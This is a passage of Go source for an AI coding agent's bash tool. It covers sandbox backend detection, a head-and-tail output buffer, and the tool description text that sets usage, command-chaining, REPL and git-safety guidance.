	BackendLandlock = "landlock"
	BackendSrt      = "srt"
	BackendNone     = "none"
)

// SandboxBackend names the confinement that local bash commands get on this host: Landlock (Linux), srt (macOS,
// Windows, or Linux without Landlock) or none. "none" means commands run with the user's full rights, and a host
// application should say so rather than show a lock.
func SandboxBackend() string {
	switch {
	case landlockAvailable():
		return BackendLandlock
	case srtAvailable():
		return BackendSrt
	}
	return BackendNone
}

// SandboxKind reports which sandbox backend this specific Tool instance
// actually resolved to at construction — EnvironmentDocker only if Docker
// was requested via ToolConfig.SandboxKind AND passed its health check;
// EnvironmentLocal otherwise (Landlock on Linux, unconfined elsewhere — see
// SandboxAvailable for that distinction, which this method doesn't make).
func (t *Tool) SandboxKind() sandbox.EnvironmentKind {
	if t.sandboxExecutor != nil {
		return t.sandboxExecutor.Kind()
	}
	return sandbox.EnvironmentLocal
}

// ── cappedBuffer — head + tail biased truncation ───────────────────────────────

// cappedBuffer captures up to `max` bytes of output from a command, keeping
// the first headOutputFraction*max bytes and the last remaining bytes, with a
// clear marker between them. This preserves both the startup output (context)
// and the final output (result) of a long-running command.
type cappedBuffer struct {
	max  int64
	head bytes.Buffer // first headSize bytes
	tail bytes.Buffer // ring buffer for the last tailSize bytes
	// tailRing is a pre-allocated ring buffer of size tailSize.
	tailRing []byte
	tailPos  int  // write position in ring
	tailFull bool // ring has been filled at least once
	headFull bool // head is full
	headSize int64
	tailSize int64
	total    int64 // total bytes received
}

func newCappedBuffer(max int64) *cappedBuffer {
	if max <= 0 {
		max = MaxOutputSize
	}
	headSize := int64(float64(max) * headOutputFraction)
	tailSize := max - headSize
	return &cappedBuffer{
		max:      max,
		headSize: headSize,
		tailSize: tailSize,
		tailRing: make([]byte, tailSize),
	}
}

func (b *cappedBuffer) Write(p []byte) (int, error) {
	n := len(p)
	b.total += int64(n)

	for _, c := range p {
		if !b.headFull {
			b.head.WriteByte(c)
			if int64(b.head.Len()) >= b.headSize {
				b.headFull = true
			}
			continue
		}
		// Write into the ring buffer for the tail.
		b.tailRing[b.tailPos] = c
		b.tailPos++
		if b.tailPos >= len(b.tailRing) {
			b.tailPos = 0
			b.tailFull = true
		}
	}
	return n, nil
}

func (b *cappedBuffer) String() string {
	if !b.headFull {
		// Everything fits in head — no truncation.
		return b.head.String()
	}

	var out strings.Builder
	out.Write(b.head.Bytes())

	// Reconstruct tail from ring buffer.
	var tail []byte
	if b.tailFull {
		tail = append(b.tailRing[b.tailPos:], b.tailRing[:b.tailPos]...)
	} else {
		tail = b.tailRing[:b.tailPos]
	}

	omitted := b.total - b.headSize - int64(len(tail))
	if omitted > 0 {
		fmt.Fprintf(&out, "\n... (%d bytes omitted) ...\n", omitted)
	}
	out.Write(tail)
	return out.String()
}

// ── Tool metadata ──────────────────────────────────────────────────────────────

// ToolName is the tool name.
const ToolName = "bash"

// Description is the tool description.
const Description = `Execute shell commands in the current directory. Supports background execution and returns stdout/stderr with exit code.

The working directory persists between commands but shell state does not. The environment is initialized from the user's profile (bash or zsh).

## When to use

Use bash when no dedicated tool covers the operation: running build systems, package managers, git commands, test runners, CLI tools, process management, or one-off scripts.

## When NOT to use

Prefer dedicated tools over bash whenever a dedicated tool exists — they are safer, parse output correctly, and respect permission boundaries:
- File discovery: use glob (not find or ls)
- Content search: use grep (not shell grep or rg)
- Read files: use read_file (not cat/head/tail)
- Edit files: use edit_file (not sed/awk)
- Write files: use write_file (not echo > / cat <<EOF)
- MCP tools: if an MCP-provided tool covers the same operation, prefer the MCP tool over a bash equivalent

Instructions:
- description is required: a clear, 5-10 word summary in active, present tense (e.g. "Lists files in current directory", "Runs the test suite"). It's shown to the user in place of the raw command whenever the tool call is collapsed, so avoid vague filler like "Runs a command".
- If your command will create new directories or files, first use this tool to run ls to verify the parent directory exists and is the correct location.
- Always quote file paths that contain spaces with double quotes in your command.
- Try to maintain your current working directory throughout the session by using absolute paths and avoiding cd. You may use cd if the user explicitly requests it.
- You may specify an optional timeout in seconds (up to 300, which is 5 minutes). By default, your command times out after 30 seconds.
- You can use run_in_background to run the command in the background and return immediately.

When issuing multiple commands:
- If the commands are independent and can run in parallel, make multiple bash calls in a single message.
- If the commands depend on each other and must run sequentially, use a single bash call with && to chain them together.
- Use ; only when you need to run commands sequentially but do not care if earlier commands fail.
- Do not use newlines to separate commands.

## Interactive processes and REPLs

For anything that benefits from staying resident between calls — iterative data analysis with pandas/numpy, testing an API from a Node.js REPL, driving a database CLI (mysql/psql), or stepping through a debugger — don't shell out to a fresh one-shot command per step (e.g. re-running "python3 -c '...'" from scratch each time, re-reading and re-parsing the same file every call). Instead, keep one interpreter process alive and talk to it:

1. run_in_background: true to start the interpreter itself (e.g. "python3 -i", "node", "R --no-save", "mysql -u root") and get back a task_id. The process keeps running after this call returns.
2. write_stdin (task_id, input) to feed it code or commands, one call at a time. State — imported modules, variables, loaded dataframes, an open DB connection — persists across calls because the interpreter never exits between them. It waits for new output and returns as soon as the process looks idle at its next prompt, or the process finishes.
3. job_output (task_id) to check buffered output later, e.g. after a long computation you didn't wait on. job_kill (task_id) when done with it.

Example — analysing a CSV with pandas without re-reading it on every step:
- run_in_background bash: "python3 -i"
- write_stdin: "import pandas as pd; df = pd.read_csv('sales.csv')"
- write_stdin: "df.groupby('region')['revenue'].sum()"

The loaded dataframe stays in memory for every subsequent write_stdin call on that task_id, instead of being reloaded from disk each time.

Git safety:
- Prefer to create a new commit rather than amending an existing commit.
- Before running destructive operations, consider whether there is a safer alternative.
- Never skip hooks or bypass signing unless the user explicitly asks.
- Only create commits when requested by the user.

Avoid unnecessary sleep commands:
- Do not sleep between commands that can run immediately.
- If your command is long running and you want notification when it finishes, use run_in_background.
- Do not retry failing commands in a sleep loop - diagnose the root cause.
- If you must sleep, keep the duration short (1-5 seconds).

Use the gh command via bash for GitHub-related tasks such as issues, pull requests, checks, and releases.`

// SearchHint is a hint for tool search functionality.
const SearchHint = "run shell commands in the terminal"
